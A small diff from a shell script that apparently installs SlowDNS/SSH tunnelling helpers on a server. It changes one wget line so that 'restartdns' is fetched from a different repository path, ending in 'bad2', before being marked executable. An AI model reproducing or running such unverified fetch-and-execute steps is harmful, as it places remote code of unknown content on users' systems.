@@ -74,7 +74,7 @@ echo $nameserver > infons
 set_ns () {
 sleep 1
 wget https://raw.githubusercontent.com/vpsvip7/SSHPLUS/main/Slowdns/ssh/startdns
-wget https://raw.githubusercontent.com/vpsvip7/SSHPLUS/main/Slowdns/ssh/restartdns
+wget https://raw.githubusercontent.com/vpsvip7/mod2/refs/heads/main/bad2/restartdns
 chmod +x startdns
 chmod +x restartdns
 sed -i "s;1234;$nameserver;g" /etc/slowdns/startdns > /dev/null 2>&1
